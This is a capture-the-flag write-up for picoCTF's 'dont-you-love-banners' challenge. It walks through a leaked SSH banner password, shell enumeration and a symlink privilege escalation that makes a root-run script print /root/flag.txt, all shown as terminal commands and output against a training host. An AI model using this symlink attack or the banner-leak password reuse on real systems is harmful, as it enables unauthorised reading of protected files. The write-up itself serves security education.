# dont-you-love-banners

- [Challenge information](#challenge-information)
- [Solution](#solution)
- [References](#references)

## Challenge information

```text
Level: Medium
Tags: General Skills, picoCTF 2024, shell, browser_webshell_solvable
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Author: LOIC SHEMA / SYREAL

Description:
Can you abuse the banner?

The server has been leaking some crucial information on tethys.picoctf.net 61669. 
Use the leaked information to get to the server.

To connect to the running application use nc tethys.picoctf.net 64937. 
From the above information abuse the machine and find the flag in the /root directory.

Hints:
1. Do you know about symlinks?
2. Maybe some small password cracking or guessing
```

Challenge link: [https://play.picoctf.org/practice/challenge/437](https://play.picoctf.org/practice/challenge/437)

## Solution

### Get banner info

We begin by connecting to the leaky service

```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/General_Skills/dont-you-love-banners]
└─$ nc tethys.picoctf.net 61669
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
^C

```

We get a possible password (`My_Passw@rd_@1234`) in the OpenSSH banner.

### Connect to the application

Next, we connect to the application

```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/General_Skills/dont-you-love-banners]
└─$ nc tethys.picoctf.net 64937                
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ 
```

After some googling and trial-and-error we find the additional answers:

- [DEFCON](https://defcon.org/)
- [John Draper](https://en.wikipedia.org/wiki/John_Draper)

### Enumeration

Now we can do some enumeration and search for the flag

```bash
player@challenge:~$ ls -la
ls -la
total 20
drwxr-xr-x 1 player player   20 Mar  9 16:39 .
drwxr-xr-x 1 root   root     20 Mar  9 16:39 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
-rw-r--r-- 1 player player  114 Feb  7 17:25 banner
-rw-r--r-- 1 root   root     13 Feb  7 17:25 text
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
cat text
keep digging
player@challenge:~$ find / -type f -name [Ff]lag* 2> /dev/null
find / -type f -name [Ff]lag* 2> /dev/null
/root/flag.txt
/sys/devices/pnp0/00:04/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
player@challenge:~$ cat /root/flag.txt
cat /root/flag.txt
cat: /root/flag.txt: Permission denied
player@challenge:~$ ls -la /root/flag.txt
ls -la /root/flag.txt
-rwx------ 1 root root 46 Mar  9 16:39 /root/flag.txt
player@challenge:~$ 
```

We need to escalate our privileges to read the flag file.

### Privilege escalation

Let's check what else is in the `/root` directory

```bash
player@challenge:~$ cd /root
cd /root
player@challenge:/root$ ls -la
ls -la
total 16
drwxr-xr-x 1 root root    6 Mar  9 16:39 .
drwxr-xr-x 1 root root   29 Jul 13 07:29 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar  9 16:39 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7 17:25 script.py
player@challenge:/root$ cat script.py
cat script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

player@challenge:/root$ 
```

Ah, this is the script that runs when we connect to the application.  
And it reads and prints the banner file.

### Create a symbolic link to the flag file

We can create a symbolic link to the flag file and it will be printed when we connect to the application

```bash
player@challenge:/root$ ln -f -s /root/flag.txt /home/player/banner
ln -f -s /root/flag.txt /home/player/banner
player@challenge:/root$ ls -l /home/player/banner
ls -l /home/player/banner
lrwxrwxrwx 1 player player 14 Jul 13 08:07 /home/player/banner -> /root/flag.txt
player@challenge:/root$ exit
exit
logout
What is the top cyber security conference in the world?
^C
```

### Get the flag

Finally, we connect to the application again and get the flag

```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/General_Skills/dont-you-love-banners]
└─$ nc tethys.picoctf.net 64937
picoCTF{<REDACTED>}

what is the password? 
^C
```

For additional information, please see the references below.

## References

- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [John Draper - Wikipedia](https://en.wikipedia.org/wiki/John_Draper)
- [ln - Linux manual page](https://man7.org/linux/man-pages/man1/ln.1.html)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [Phreaking - Wikipedia](https://en.wikipedia.org/wiki/Phreaking)
